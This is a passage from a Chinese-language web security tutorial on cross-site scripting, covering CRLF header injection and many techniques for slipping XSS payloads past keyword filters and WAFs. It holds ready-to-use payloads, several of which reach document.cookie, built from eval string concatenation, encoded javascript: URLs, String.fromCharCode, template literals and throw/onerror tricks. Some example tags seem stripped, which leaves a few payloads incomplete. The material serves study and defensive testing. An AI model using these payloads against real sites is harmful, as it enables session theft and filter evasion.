http数据报文的格式是这样的
需要再多注入%0d%0a%0d%0a,即两个crlf
这时的内容就会被视为http body而直接输出到源码中,浏览器会将其解析
因此就产生了bypass浏览器filter的注入。
但是php高版本中已不允许发送多行header
因此这个利用方法只适用于其他语言的web环境下进行利用
#3 各类针对关键字过滤的bypass
在实际的业务场景中,xss会受到程序本身,或者是可能存在的waf的影响,他们会过滤或者替换掉
攻击者payload中的某些特定关键字,因此针对关键字过滤的bypass也一直是我们主要关注的方向
#3.1 过滤特定标签
这种过滤其实真的已经无法起效了,任何一个标签都可以构造出XSS,因此不再赘述
一个示例payload 
利用事件来触发xss
也可以是利用来加载一个远程的flash文件,制造xss
当然,如果输出点在html属性中,即使过滤了尖括号<>,如果可以闭合属性的冒号
那么仍然产生了dom-xss,利用事件足以摧毁开发者的防御。
#3.2 通用的敏感关键字绕过方法
关键字过滤是针对敏感变量,或者函数的,比如cookie,eval等
又或者是()符号,
那么介绍几种通用的绕过的方法
1. 利用数组方式来拼接
js里的对象成员方法也可以用数组的形式的表示
简单的说,比如eval()函数就可以用top对象的成员方法来表示
top['ev'+'al'](evalcode)
这时,比如过滤了eval,我们可以这样来触发xss
x="onfocus=top["ev"%2b"al"](alert(1))//
使用字符串拼接的方式来构造出eval
2. 利用location的url解码特点
现代浏览器基本支持javascript:code 这种伪协议
而location在跳转的过程中又会自动解码,因此我们可以试图把敏感部分进行二次编码
存放到location部位。
比如我们通过这样的方式来调用eval
x="onfocus=location="javascript:%2565%2576%2561%256c(alert(1))"//
可以看到,成功的通过eval去调用了alert(1)
那你会问,如果括号也被过滤了呢? 继续编码就好了
构造如下的payload
x="onfocus=location="javascript:%2565%2576%2561%256c%2528alert%25281%2529%2529"//
3.利用location.hash来存放
location.hash是浏览器中用于定位锚的字符串,它是不会向服务端发送的,因此也不会被过滤
所以我们可以构造如下payload来进行绕过
x="onfocus=outerHTML=location.hash//#
4. String.fromCharcode() 可以从ascii码中解析出特定的字符串,比如这里过滤document.cookie
使用如下的payload
x="onfocus=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))//
就可以成功绕过
5. 利用window.name进行跨域传输
用在location.hash被过滤/长度不够,或者不能使用点号的情况
这里可以使用一个的方式,在window.name中存储代码
其实这种方法也被称为回旋镖
它能够把一个反射XSS升格为类似存储型XSS的效果
这里以绕过对eval的过滤为例
将其保存为一个html,随便放置在一个地方,就像普通的xss那样触发
6.利用标签,内部的标签和语句遵循的规定是直接继承自xml而不是html
区别在于,内部的标签中,可以允许一部分进制/编码后的字符(比如实体编码)
这里绕过对括号的过滤,使用实体编码为例,&#[十进制],&#x[十六进制] 作为例子
使用如下payload
1">
成功的进行了绕过
补充:svg里的,还甚至可以使用来进行整段注释
7.利用ES6模板字符串
`${some string}` 使用反引号
中间的some string会被当作表达式解析,简单的说就是你可以在这里使用变量
当然,一个很明显的地方就是,如果只是过滤了某个特定的字符,完全可以用这种方式绕过
举个简单的例子,如果过滤掉了1
我们可以用 `${3-2}` 这种方式来表示1
而且有一部分函数是支持不用括号传参,直接使用模板字符串作为参数的。
比如prompt,我们这里用它来弹出1
使用如下的payload
x="onfocus=prompt`${3-2}`//
可以成功的绕过
补:这种方法并非真正的进行了绕过
因为用es6进行传参的时候 "," 会作为第一个参数传递给目标函数
会导致错误。
这时,则需要使用对象(函数)的.call方法来传递
这时,原本.call方法的第一个参数是this指针,而它即使是null也能正确执行
而它接受到了","这个非法参数,则默认为null执行
如果调用的对象(函数)是一个全局对象,也能得到正确的执行。
比如eval.call`${name}`
这时如果我能操控window.name,则会正确的执行我们的代码。
当然如果能使用引号
eval.call`${'alert(1)'}`
也是能正确执行目标代码的
而且没有使用() 括号进行传参
#3.3 针对特定敏感关键字的绕过方法
1.针对过滤了.符号
使用with()方法可以设定对象的作用域
也就是我原本要访问location.hash
由于点号被过滤
只需要使用with(location)hash即可
构造payload如下
1"onfocus=with(location)alert(hash)//#11
如果过滤的点号被使用在域名中
那么在ie/chrome/ff下
使用 。(%E3%80%82) 是可以代替 .的
2.针对过滤了()号
使用throw传递参数,配合 ES6模板字符串 `${some string}` 
具体的思路是,throw可以抛出一个异常(err)交给异常处理函数去处理
但是如果它没有在try...catch结构中使用的话,就会引发一个uncaught 'err内容' 的异常
也就是抛出的整个异常内容是 "uncaugh 'err内容'"
比如这样
所以,如果我们把异常处理函数绑定为eval
eval实际收到的就是一个Uncaught=alert(document.cookie)的表达式
它会自动执行这个表达式
而throw本身接受参数的时候是可以接受模板字符串作为参数的
所以构造如下payload
1"onfocus=top.onerror=eval;throw`=alert\x28document.cookie\x29`//
这里等号的目的就是使它成为一个合法的表达式
成功的绕过
3.过滤了空格
在标签的名称和第一个属性之间 可以用 / 来代替空格
而在其他的某几个位置换行符也是可以起效的,具体我没有进行测试
《web之困》上有一个讲解这个知识点的地方
只是大概的举一个payload作为例子
x=1">
我们不使用双引号来闭合,但是通过%0a作为分隔符获得了一样的效果
4.过滤了\r\n等换行符
javascript里允许用U+2028作为换行符
因此,这时我们可以插入一个\u2028来实现绕过
5.过滤,而最终又转换为了大写
http://dba86.com/docs/other/grep.html
中给出了一些德语符号和拉丁文符号
其中拉丁文中的'long s' 在大写时会被转换为英语的'S'
因此可以绕过这个限制。
6.过滤了大部分符号,而又输出在var x = {} 中
只要双引号和()没被绕过
就可以使用"somestr"(alert(1))in"otherstr"
的方式执行
原理是这样的
js的解释器的特点 => 初步检查只管语法正确 => ('只要不报syntax error')则类型等其他问题只有等执行时才会报错 => 在报错之前会按照语法树解析的顺序一直执行下
去。
而"somestr"()则是把"somestr"(注意,是包含引号的整体)作为了函数名
把(alert(1))作为参数进行传递
而这时会先进行参数值的解析,因此函数会得到执行
7.过滤了注释符//
-->也可以作为js的行注释符
比如构造如下payload
8.仍然是过滤了//,只是这次用在协议+域名中
在ie下
使用 /ゝ (%E3%82%9D) 代替 //